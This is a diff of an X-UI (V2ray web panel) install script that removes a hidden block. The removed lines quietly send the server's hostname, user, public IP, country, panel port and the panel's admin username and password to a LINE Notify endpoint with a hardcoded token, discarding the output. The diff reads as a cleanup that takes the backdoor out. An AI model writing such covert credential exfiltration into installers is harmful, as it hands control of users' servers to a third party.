@@ -243,20 +243,6 @@ install_xui() {
     show_login_info
     echo -e ""
     yellow "(If you cannot access the X-UI panel, first enter the X-UI command in the SSH command line, and then select the 17 option to let go of the firewall port)"
-	HOSTNAME=$(hostname)
-	DATE=`date '+%d-%m-%Y %H:%M:%Sน.'`
-	IP01=$(wget -qO- ipv4.icanhazip.com)
-	CY01=$(wget -qO- ipinfo.io/country)
-    curl --silent  POST https://notify-api.line.me/api/notify \
-  -H 'authorization: Bearer AQtZv5GECNeLogNpp3EnpI4erhBLJWqj4lxsCeUcJm8' \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d message="ติดตั้งสคริปต์ 🔑(พรีเมี่ยม)🔑
-🖥️ ติดตั้งด้วยชื่อ : $USER
-💽 โฮสต์เซิร์ฟเวอร์ : $HOSTNAME
-🔐 สคริปต์ถูกรันโดย :  http://$IP01:$config_port ($CY01)
-📆 วันที่ : $DATE
-⚙️ ระบบ WebPanel V2ray 
-🔑 ชื่อผู้ใช้/รหัสผ่าน : $config_account/$config_password" > /dev/null
 }
 
 show_login_info(){
